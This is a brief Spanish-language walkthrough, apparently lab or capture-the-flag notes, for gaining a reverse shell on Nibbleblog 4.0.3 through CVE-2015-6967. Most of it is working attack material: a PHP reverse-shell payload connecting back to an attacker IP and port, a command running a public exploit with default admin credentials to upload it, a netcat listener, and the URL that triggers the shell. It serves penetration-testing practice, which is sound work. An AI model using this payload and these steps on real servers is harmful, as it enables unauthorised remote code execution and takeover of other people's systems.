## Rev shell en versión 4.0.3

Desde el panel de admin activar el Plugin My image. 

Luego crear una shell:

shell.php

```bash
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Descargar el exploit:

https://github.com/dix0nym/CVE-2015-6967

Ejecutarlo:

```bash
python3 exploit.py --url http://<IP>/nibbleblog/ --username admin --password admin --payload shell.php
```

Si sale bien, me pongo en escucha:

```bash
nc -lnvp PORT
```

Y desde la URL ejecuto:

```bash
http://<IP>/nibbleblog/content/private/plugins/my_image/image.php
```

Y recibo conexión.
